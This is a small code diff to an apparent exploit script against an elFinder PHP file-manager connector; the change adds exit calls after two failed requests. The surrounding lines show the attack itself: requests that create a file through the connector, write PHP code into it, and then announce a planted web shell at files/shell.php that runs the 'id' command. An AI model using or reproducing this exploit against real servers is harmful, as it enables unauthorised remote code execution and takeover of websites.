@@ -21,6 +21,7 @@ response = requests.get(f"{target}php/connector.minimal.php?cmd=mkfile&target=l1
 
 if response.status_code != 200:
     print("Something went wrong aborting...")
+    sys.exit(0)
 
 file_hash = json.loads(response.text)["added"][0]["hash"]
 
@@ -28,6 +29,7 @@ res = requests.get(f"""{target}php/connector.minimal.php?cmd=put&content=<?php s
 
 if res.status_code != 200:
     print("Something went wrong aborting...")
+    sys.exit(0)
 
 print(f"pwned! Webshell: {target}files/shell.php?66347183517170905805845495=id")
 
